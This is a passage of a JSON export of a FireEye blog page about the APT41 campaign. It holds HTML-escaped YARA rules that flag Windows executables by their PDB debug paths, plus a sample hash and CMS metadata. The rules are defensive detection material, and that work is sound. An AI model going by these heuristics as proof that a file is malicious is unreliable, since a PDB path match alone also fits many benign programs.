ascii\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003Cp\u003Erule ConventionEngine_Anomaly_MultiPDB_Double\u003C\/p\u003E\n\u003Cp\u003E{\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;@stvemillertime\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; description = \u0026quot;Searching for PE files with PDB path keywords, terms or anomalies.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; sample_md5 = \u0026quot;013f3bde3f1022b6cf3f2e541d19353c\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; ref_blog = \u0026quot;https:\/\/www.fireeye.com\/blog\/threat-research\/2019\/08\/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $pcre = \/RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}\\.pdb\\x00\/\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 2\u003C\/p\u003E\n\u003Cp\u003E}\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n",
        "jcr:lastModified": "Mon Mar 30 2020 18:21:06 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext",
        "textIsRich": "true"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EChinese actor APT41 carried out one of the broadest campaigns by a Chinese cyber espionage actor that we have observed in recent years.\u003C\/p\u003E\n",
      "jcr:lastModified": "Tue Mar 24 2020 19:39:09 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Tue Mar 24 2020 19:43:53 GMT+0000",
      "imageRotate": "0"
    },
    "sidebar": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "jeff.payne@fireeye.com",
      "jcr:lastModified": "Wed Mar 25 2020 16:56:49 GMT+0000",
      "sling:resourceType": "fireeye-www\/fdc\/components\/reuse\/reuse-blog-resources",
      "customCTA": "true",
      "grid-33-right": {
        "jcr:primaryType": "nt:unstructured",
        "sling:resourceType": "fireeye-www\/fdc\/components\/grids\/grid-parsys\/parsys-33-small\/parsys"
      }
    }
  }
}
